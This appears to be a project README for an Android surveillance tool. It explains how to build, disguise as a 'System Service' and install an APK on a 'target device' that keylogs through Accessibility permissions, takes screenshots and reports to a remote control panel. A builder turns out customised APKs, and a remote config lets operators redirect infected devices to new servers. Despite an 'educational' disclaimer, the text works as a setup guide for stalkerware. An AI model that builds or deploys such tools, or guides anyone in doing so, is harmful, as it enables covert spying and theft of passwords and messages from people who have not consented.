# Android Stealth Monitor

This project is a proof-of-concept Android application that demonstrates advanced system service capabilities, including background connectivity, accessibility features, and device monitoring. It includes a web-based control panel for managing connected devices. **This is for educational purposes only. Use responsibly and ensure compliance with all laws and ethical guidelines. Misuse can lead to legal consequences.**

## Features
- **Web Control Panel**: A responsive UI to monitor and control multiple Android devices via Socket.IO.
- **Android System Service**: Runs as a foreground service with boot receiver and keylogger (accessibility-based).
- **Dockerized Deployment**: Easy setup with containerized backend (portal for control, builder for APK generation).
- **In-Memory Device Management**: Real-time device tracking via Socket.IO events (no external DB).
- **Dynamic APK Building**: Generate customized APKs with user-specified config URL for server connectivity.
- **Remote Config Management**: Apps fetch configuration from a remote JSON file, enabling dynamic server updates without reinstalling APK.

## Configuration Architecture

The application now uses a **remote configuration model**:

1. **Config File** (JSON): Hosted on any accessible URL (GitHub, web server, etc.)
   ```json
   {
     "socket_url": "example.com:4000",
     "new_config_url": "https://raw.githubusercontent.com/user/repo/main/settings.json",
     "screenshot_quality": 70
   }
   ```
   - `socket_url`: Domain or IP with optional port and protocol (http/https).
     - Defaults: `http://` protocol, port `80` for http, port `443` for https.
     - Examples: `"example.com"`, `"example.com:8080"`, `"https://example.com"`, `"https://ws.boo.bar:4000"`
   - `new_config_url`: If present, client redirects to this URL and ignores host in this file.
   - `screenshot_quality`: Optional integer (1-100) for JPEG compression quality. Default: 70. Higher = better quality, larger file.

2. **APK Generation**: Build accepts a config URL instead of hardcoded IP/port
3. **Config Validation**: 
   - Apps validate config on startup
   - Periodic validation every 60 seconds
   - Automatic reconnection if config changes

## Prerequisites
- Docker and Docker Compose installed.

## Setup

### 1. Prepare Configuration File

Create a `settings.json` file with your server details and host it (GitHub, web server, etc.):

```json
{
  "socket_url": "your-server-domain-or-ip:4000"
}
```

- If protocol is omitted, defaults to `http://`.
- If port is omitted, defaults: `80` for `http://`, `443` for `https://`.
- Examples: `"example.com:8080"`, `"192.168.1.100"`, `"https://ws.boo.bar"`, `"https://example.com:4000"`

**Example URL**: `https://raw.githubusercontent.com/user/repo/main/settings.json`

### 2. Docker Setup
This project uses Docker for the portal (web server + Socket.IO) and builder (Android APK generation). Dockerfiles are provided: `portal/Dockerfile` and `builder/Dockerfile`. A `docker-compose.yml` file is included in the root directory for easy deployment.

1. Clone the repository

2. Build and run with Docker Compose:
   ```
   docker compose up --build
   ```

- Portal runs the web UI on http://localhost:4001.
- Builder listens on http://localhost:8080 for build requests (internal from portal).

### 3. Access the Control Panel
1. Open http://localhost:4001 in your browser.
2. The dashboard will list connected devices.

### 4. Generate and Deploy APK
1. In the UI, enter your **Config URL** (e.g., `https://raw.githubusercontent.com/user/repo/main/settings.json`)
2. Click "Build APK" – this triggers the builder service to compile a customized APK with the embedded config URL.
3. Download the generated APK from the UI link (output in `./builder/project/app/build/outputs/apk/`).
4. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-debug.apk`).
5. Grant Accessibility permissions to the "System Service" app for keylogging.
6. The app will:
   - Fetch configuration from the provided URL on startup
   - Parse host:port from the config
   - Connect to the configured host:port
   - Validate config when server sends `config_validation_request` event

### 5. Trigger Config Revalidation (Optional)
Send a POST request to trigger all connected apps to revalidate their configuration:

```bash
curl -X POST http://localhost:4001/api/validate-config
```

This is useful when you update your `settings.json` and want apps to pick up changes immediately.

### 6. Testing and Monitoring
- Android devices connect to the configured IP:port; monitor Docker logs: `docker logs portal` or `docker compose logs`.
- Use the UI to send "logger" commands (start/stop keylogging).
- Device info (IP, model, etc.) updates in real-time via Socket.IO events.

## Configuration Update Workflow

1. **Update Config File**: Modify your remote `settings.json` with new host:port
2. **Option A - Manual Push**: Call `/api/validate-config` endpoint to trigger immediate revalidation across all connected apps
3. **Option B - Wait for Restart**: Apps validate config on startup/reconnect
4. Apps automatically disconnect from old server and connect to new one

## Development
- **Portal (Node.js)**: Edit in `./portal/`. Rebuild Docker image after changes: `docker compose build portal`.
- **Android App**: Source in `./builder/project/app/`. For manual build: `cd builder/project && ./gradlew assembleDebug -PconfigUrl='https://example.com/settings.json'`.

## Security Notes
- The app requests sensitive permissions (Accessibility, Boot Complete, Internet) – disclose to users.
- Config file should be accessible but ideally protected (HTTPS recommended).
- For ethical testing only; do not deploy without explicit consent.

## License
MIT

For issues, open a GitHub issue.
